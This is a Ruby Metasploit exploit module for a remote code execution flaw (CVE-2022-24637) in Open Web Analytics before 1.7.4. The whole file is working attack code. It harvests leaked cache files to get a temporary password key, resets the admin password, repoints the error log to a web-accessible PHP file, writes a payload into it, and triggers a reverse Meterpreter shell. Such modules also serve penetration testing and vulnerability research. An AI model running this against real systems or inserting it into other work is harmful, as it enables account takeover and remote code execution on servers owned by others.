class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  require 'base64'

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Open Web Analytics 1.7.3 - Remote Code Execution (RCE)',
        'Description' => %q{
          Open Web Analytics (OWA) before 1.7.4 allows an unauthenticated remote attacker to obtain sensitive
          user information, which can be used to gain admin privileges by leveraging cache hashes.
          This occurs because files generated with '<?php (instead of the intended "<?php sequence) aren't handled
          by the PHP interpreter.
        },
        'Author' => [
          'Jacob Ebben',    # ExploitDB Exploit Author
          'Dennis Pfleger'  # Msf Module
        ],
        'References' => [
          [ 'CVE', '2022-24637'],
          [ 'EDB', '51026']
        ],
        'Licence' => MSF_LICENSE,
        'Platform' => ['php'],
        'DefaultOptions' => {
          'PAYLOAD' => 'php/meterpreter/reverse_tcp',
          'Username' => 'admin',
          'Password' => 'pwned',
          'Directory' => '/var/www/html/'
        },
        'Targets' => [ ['Automatic', {}] ],
        'DisclosureDate' => '2022-03-18',
        'DefaultTarget' => 0,
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [
            ARTIFACTS_ON_DISK, # /owa-data/caches/{get_random_string(8)}.php
            IOC_IN_LOGS, # Malicious GET/POST requests in the webservice logs
            ACCOUNT_LOCKOUTS, # Account passwords will be changed in this module
          ]
        }
      )
    )

    register_options([
      OptString.new('Username', [ false, 'Target username (Default: admin)']),
      OptString.new('Password', [ false, 'Target new password (Default: pwned)']),
      OptString.new('Directory', [ false, 'Path to the owa installation (Default: /var/www/html/)'])
    ])
  end

  def check
    res = check_connection
    return CheckCode::Unknown('Connection failed') unless res
    return CheckCode::Safe if !res.body.include?('Open Web Analytics')

    version = Rex::Version.new(res.body.scan(/version=([\d.]+)/).flatten.first)
    return CheckCode::Detected("Open Web Analytics #{version} detected") unless version < Rex::Version.new('1.7.4')

    CheckCode::Appears("Open Web Analytics #{version} is vulnerable")
  end

  def exploit
    username = datastore['Username']
    new_password = datastore['Password']

    res = check_connection
    if res
      print_good("Connected to #{full_uri} successfully!")
    end

    res = send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, '/index.php?owa_do=base.loginForm'),
      'keep_cookies' => true,
      'vars_post' => {
        'owa_user_id' => username,
        'owa_password' => rand_text_alphanumeric(8),
        'owa_action' => 'base.login'
      }
    )
    if res.code != 200
      fail_with(Failure::Unknown, 'An error occured during the login attempt!')
    end

    print_status("Attempting to find cache of '#{username}' user")

    found = false
    cache = nil
    100.times do |key|
      user_id = "user_id#{key}"
      userid_hash = Digest::MD5.hexdigest(user_id)
      filename = "#{userid_hash}.php"
      cache_request = send_request_cgi(
        'method' => 'GET',
        'uri' => normalize_uri(target_uri.path, "/owa-data/caches/#{key}/owa_user/#{filename}")
      )
      if cache_request.code == 404
        next
      end

      cache_raw = cache_request.body
      cache = get_cache_content(cache_raw)
      cache_username = get_cache_username(cache)
      if cache_username != username
        print_message("The temporary password for a different user was found. \"#{cache_username}\": #{get_cache_temppass(cache)}", 'INFO')
        next
      else
        found = true
        break
      end
    end

    if !found
      fail_with(Failure::Unknown, "No cache found. Are you sure \"#{username}\" is a valid user?")
    end

    cache_temppass = get_cache_temppass(cache)
    print_good("Found temporary password for user '#{username}': #{cache_temppass}")

    res = send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, '/index.php?owa_do=base.usersPasswordEntry'),
      'keep_cookies' => true,
      'vars_post' => {
        'owa_password' => new_password,
        'owa_password2' => new_password,
        'owa_k' => cache_temppass,
        'owa_action' => 'base.usersChangePassword'
      }
    )

    if res.code != 302
      fail_with(Failure::Unknown, 'An error occurred when changing the user password!')
    end
    print_good("Changed the password of '#{username}' to '#{new_password}'")

    res = send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, '/index.php?owa_do=base.loginForm'),
      'keep_cookies' => true,
      'vars_post' => {
        'owa_user_id' => username,
        'owa_password' => new_password,
        'owa_action' => 'base.login'
      }
    )

    redirect = res['location']
    res = send_request_cgi(
      'method' => 'GET',
      'uri' => URI(redirect).path
    )
    if res && res.code == 200
      print_good("Logged in as #{username} user")
    else
      fail_with(Failure::Unknown, "An error occurred during the login attempt of user #{username}")
    end

    res = send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, '/index.php?owa_do=base.optionsGeneral')
    )

    shell_filename = "#{rand_text_alphanumeric(8)}.php"
    shell_url = "#{full_uri}owa-data/caches/#{shell_filename}"

    nonce = get_update_nonce(res)
    log_location = "#{datastore['Directory']}owa-data/caches/" + shell_filename

    res = send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, '/index.php?owa_do=base.optionsGeneral'),
      'keep_cookies' => true,
      'vars_post' => {
        'owa_nonce' => nonce,
        'owa_action' => 'base.optionsUpdate',
        'owa_config[base.error_log_file]' => log_location,
        'owa_config[base.error_log_level]' => 2
      }
    )
    if !res
      fail_with(Failure::Unknown, 'An error occurred when attempting to update config!')
    else
      print_status('Creating log file')
    end

    res = send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, '/index.php?owa_do=base.optionsGeneral'),
      'keep_cookies' => true,
      'vars_post' => {
        'owa_nonce' => nonce,
        'owa_action' => 'base.optionsUpdate',
        'owa_config[shell]' => payload.encoded + '?>'
      }
    )
    if !res
      fail_with(Failure::Unknown, 'An error occurred when attempting to update config!')
    else
      print_good('Wrote payload to file')
    end

    send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, "/owa-data/caches/#{shell_filename}")
    )

    print_good('Triggering payload! Check your listener!')
    print_status("You can trigger the payload again at #{shell_url}")
  end

  def check_connection
    res = send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, '/index.php?owa_do=base.loginForm')
    )
    if !res
      fail_with(Failure::Unknown, "Could not connect to #{full_uri}")
    else
      res
    end
  end

  def get_cache_content(cache_raw)
    regex_cache_base64 = /\*(\w*={0,2})/
    regex_result = cache_raw.match(regex_cache_base64)

    unless regex_result
      fail_with(Failure::Unknown, 'The provided URL does not appear to be vulnerable!')
    end

    Base64.decode64(regex_result[1]).force_encoding('ascii')
  end

  def get_cache_username(cache)
    match = cache.match(/"user_id";O:12:"owa_dbColumn":11:{s:4:"name";N;s:5:"value";s:5:"(\w*)"/)
    match[1]
  end

  def get_cache_temppass(cache)
    match = cache.match(/"temp_passkey";O:12:"owa_dbColumn":11:{s:4:"name";N;s:5:"value";s:32:"(\w*)"/)
    match[1]
  end

  def get_update_nonce(page)
    update_nonce = page.body.match(/owa_nonce" value="(\w*)"/)[1]
    update_nonce
  end
end
